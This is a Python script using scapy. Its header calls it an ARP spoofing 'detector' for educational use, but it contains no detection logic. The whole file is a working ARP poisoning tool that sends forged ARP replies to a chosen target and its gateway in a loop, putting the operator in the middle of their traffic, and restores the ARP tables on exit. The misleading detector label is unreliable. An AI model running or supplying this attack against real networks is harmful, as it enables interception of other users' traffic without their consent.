#!/usr/bin/env python3
"""
ARP Spoofing Detector/Poisoning Tool (Educational Purposes Only)
Author: Tim
Usage: sudo python3 arp_spoof.py <target_ip> <gateway_ip> [interface]
"""
import os
import sys
import time
import logging
from scapy.all import ARP, Ether, sendp, srp, conf

# Configuration
INTERFACE = "wlp3s0"  # Default interface
SLEEP_TIME = 2  # Seconds between ARP packets
LOG_FILE = "arp_spoof.log"

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

def get_mac(ip, interface=INTERFACE):
    """Get MAC address for given IP"""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                    timeout=2, iface=interface, verbose=False)
        return ans[0][1].src if ans else None
    except Exception as e:
        logging.error(f"Error getting MAC for {ip}: {e}")
        return None

def arp_spoof(target_ip, gateway_ip, interface=INTERFACE):
    """Perform ARP spoofing attack"""
    try:
        logging.info(f"Starting ARP spoofing [Target: {target_ip}, Gateway: {gateway_ip}]")
        
        target_mac = get_mac(target_ip, interface)
        gateway_mac = get_mac(gateway_ip, interface)
        
        if not target_mac or not gateway_mac:
            logging.error("Could not resolve MAC addresses. Exiting.")
            return False

        while True:
            try:
                # Poison target
                sendp(Ether(dst=target_mac)/ARP(
                    op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip
                ), iface=interface, verbose=False)
                
                # Poison gateway
                sendp(Ether(dst=gateway_mac)/ARP(
                    op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip
                ), iface=interface, verbose=False)
                
                time.sleep(SLEEP_TIME)
                
            except KeyboardInterrupt:
                logging.info("\nDetected CTRL+C - Restoring ARP tables...")
                restore_arp(target_ip, gateway_ip, interface)
                return True
                
    except Exception as e:
        logging.error(f"ARP spoofing failed: {e}")
        return False

def restore_arp(target_ip, gateway_ip, interface=INTERFACE):
    """Restore ARP tables to original state"""
    try:
        target_mac = get_mac(target_ip, interface)
        gateway_mac = get_mac(gateway_ip, interface)
        
        if target_mac and gateway_mac:
            logging.info("Restoring ARP tables...")
            # Send correct ARP replies
            sendp(Ether(dst=target_mac)/ARP(
                op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip
            ), iface=interface, count=5, verbose=False)
            
            sendp(Ether(dst=gateway_mac)/ARP(
                op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip
            ), iface=interface, count=5, verbose=False)
            
            return True
        return False
    except Exception as e:
        logging.error(f"Error restoring ARP: {e}")
        return False

def check_root():
    """Check if running as root"""
    if os.geteuid() != 0:
        logging.error("This script requires root privileges. Please run with sudo.")
        return False
    return True

def validate_ips(target_ip, gateway_ip):
    """Validate IP addresses"""
    from ipaddress import ip_address
    try:
        ip_address(target_ip)
        ip_address(gateway_ip)
        return True
    except ValueError:
        logging.error("Invalid IP address format")
        return False

def main():
    if not check_root():
        sys.exit(1)
        
    if len(sys.argv) < 3:
        logging.error(f"Usage: {sys.argv[0]} <target_ip> <gateway_ip> [interface]")
        logging.info(f"Example: {sys.argv[0]} 192.168.100.100 192.168.100.1 wlp3s0")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3] if len(sys.argv) > 3 else INTERFACE
    
    if not validate_ips(target_ip, gateway_ip):
        sys.exit(1)
        
    # Set scapy interface
    conf.iface = interface
    
    if not arp_spoof(target_ip, gateway_ip, interface):
        sys.exit(1)

if __name__ == "__main__":
    main()